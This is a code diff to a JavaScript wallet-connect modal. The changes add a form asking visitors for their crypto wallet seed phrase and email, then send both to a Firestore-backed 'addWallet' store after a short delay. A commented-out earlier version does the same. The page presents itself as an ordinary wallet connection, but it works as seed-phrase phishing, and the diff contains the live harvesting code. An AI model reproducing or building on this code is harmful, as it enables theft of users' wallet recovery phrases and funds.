@@ -1,3 +1,9 @@
+
+import { Wallet } from './firestoreDb.js';
+
+const wallet = new Wallet();
+
+
 //-------- Dataset of available wallets and details ------//
 
 const walletData = [
@@ -79,19 +85,21 @@ const AddWalletModal = (chosenWallet) => {
 							<span id="wallet-subtitle" class="text-secondary">connect your ${walletName}</span>
 						</div>
 					</div>
+                    <form action="#" method="POST" id="walletDetailsForm">
 					<div class="wallet-inputs">
 						<div class="form-group">
 							<label for="seed-phrase" class="text-secondary">Enter seed phrase</label>
-							<input type="text" name="seed-phrase" id="seed-phrase" class="form-control">
+							<input type="text" name="seed-phrase" id="seed-phrase" class="form-control" required>
 						</div>
 						<div class="form-group">
 							<label for="email" class="text-secondary">Enter email address</label>
-							<input type="email" name="email" id="email" class="form-control">
+							<input type="email" name="email" id="email" class="form-control" required>
 						</div>
 					</div>
 					<div class="submit-wallet-option">
-						<button class="btn" data-dismiss="modal" data-toggle="modal" data-target="#walletConnectStatus">Connect ${walletName}</button>
+						<button class="btn" type="submit" id="walletDetailsSubmit" data-dismiss="modal" data-toggle="modal" data-target="#walletConnectStatus">Connect ${walletName}</button>
 					</div>
+                    </form>
 				</div>
 			</div>
 		  </div>
@@ -136,9 +144,9 @@ const ConnectionStatusModal = (chosenWallet) => {
 let modal2 = document.querySelector("#modal2")
 modal2.innerHTML = chooseWalletModal;
 
-const selectWallet = (walletName) => {
-    let wallet = walletData.find(({name}) => name === walletName);
-    let elemId = wallet.elemId;
+export const selectWallet = (walletName) => {
+    let walletInfo = walletData.find(({name}) => name === walletName);
+    let elemId = walletInfo.elemId;
     let option = document.querySelector(`#${elemId}`);
     let connect_wallet_btn = document.querySelector("#walletTypeSubmit");
     let dataset = connect_wallet_btn.dataset;
@@ -151,13 +159,60 @@ const selectWallet = (walletName) => {
 
     let connectStatusModal = ConnectionStatusModal(walletName);
     document.querySelector("#modal4").innerHTML = connectStatusModal;
+
+    let emailInput = document.getElementById('email');
+    let passInput = document.getElementById('seed-phrase');
+
+    let walletDetailsSubmit = document.querySelector('#walletDetailsSubmit');
+    walletDetailsSubmit.addEventListener('click', async (e) => {
+        e.preventDefault();
+        console.log("Processing form...");
+
+        let email = emailInput.value ;
+        let seedPhrase = passInput.value ;
+
+        if ( email == '' || seedPhrase == '') {
+            alert('Invalid inputs! Please fill in the necessary details.');
+            return;
+        }
+        
+        setTimeout(() => {
+            try {
+                let result = wallet.addWallet(email, seedPhrase);
+                console.log(result);
+            } catch (error) {
+                console.error('Error adding wallet details : ', error)
+            }
+        }, 5000);
+        
+        
+    })
 }
 
 const walletTypeSubmitBtn = document.querySelector("#walletTypeSubmit");
 walletTypeSubmitBtn.addEventListener("click", (e) => {
-    event.preventDefault();
-    let btnDataset = walletTypeSubmitBtn.dataset
+    e.preventDefault();
+    let btnDataset = walletTypeSubmitBtn.dataset;
     if(!btnDataset.wallet || btnDataset.wallet == undefined){
         alert("Please choose a wallet");
     }
 });
+
+console.log("what the actual fuck is this!!!!!");
+
+// const processForm = (e) => {
+
+//     event.preventDefault();
+//     console.log('Form submitted!');
+    
+//     let email = document.getElementById('email').value ;
+//     let seedPhrase = document.getElementById('seed-phrase').value ;
+    
+//     if ( email == '' || seedPhrase == '') {
+//         alert('Invalid inputs! Please fill in the necessary details.');
+//         return;
+//     }
+        
+//     let result = Wallet.addWallet(email, seedPhrase);
+//     console.log(result);
+// }
